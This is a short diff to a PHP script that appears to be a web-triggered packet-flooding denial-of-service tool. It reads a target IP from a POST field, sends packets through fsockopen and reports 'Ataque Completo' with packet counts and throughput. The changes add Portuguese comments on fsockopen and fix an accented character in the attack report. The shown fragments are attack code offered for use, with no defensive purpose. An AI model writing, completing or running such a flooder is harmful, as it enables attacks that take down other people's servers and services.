@@ -4,6 +4,10 @@
 //Ardamax Sola Muiiiito
 //www.ZeroDayExile.com
 //=================================================
+//***fsockopen() retorna um ponteiro de arquivo que pode ser usado em em conjunto com outras funções de arquivo (como fgets(), fgetss(), fwrite(), fclose(), e feof()). Se a chamada falhar, ela retornará FALSE.
+//***Se a chamada falhar, ela retornará FALSE.
+
+
 
 $packets = 0;
 $ip = $_POST['ip'];
@@ -34,6 +38,6 @@ $packets++;
                 fclose($fp);
         }
 }
-echo "Ataque Completo".time('h:i:s')." com $packets (" . round(($packets*65)/1024, 2) . " mB) pacotes em m�dia ". round($packets/$exec_time, 2) . " packets por/segundo \n";
+echo "Ataque Completo".time('h:i:s')." com $packets (" . round(($packets*65)/1024, 2) . " mB) pacotes em média ". round($packets/$exec_time, 2) . " packets por/segundo \n";
 ?>
 
